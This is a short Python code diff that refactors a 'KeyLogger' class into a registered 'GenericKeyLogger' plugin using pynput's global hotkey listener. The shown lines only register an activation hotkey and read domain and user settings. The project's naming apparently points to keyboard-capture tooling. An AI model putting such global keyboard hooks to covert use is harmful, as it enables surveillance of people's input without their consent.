@@ -1,17 +1,15 @@
 import time
-import threading
-
-from core.Register import Type
 from pynput import keyboard
 
+from keyloggers.KeyLogger import KeyLogger
+from core.Register import Type, Register
 
-class KeyLogger(threading.Thread):
+
+@Register(Type.KEYLOGGER, "generic_kl",
+          "Generic Keylogger")
+class GenericKeyLogger(KeyLogger):
     def __init__(self, conf: dict, namespace, controller):
-        threading.Thread.__init__(self)
-        self._conf = conf
-
-        self._namespace = namespace
-        self._controller = controller
+        super().__init__(conf, namespace, controller)
 
         self._domain = self._conf["default_domain"]
         self._user = self._conf["user"]
@@ -65,7 +63,7 @@ class KeyLogger(threading.Thread):
             self._action[0](self._action[1])
             self._action = None
 
-    def run(self):
+    def capture(self):
         with keyboard.GlobalHotKeys({
                 self._conf["keylogger"]["activation_hk"]: self.on_activate_domain}) as h:
             h.join()
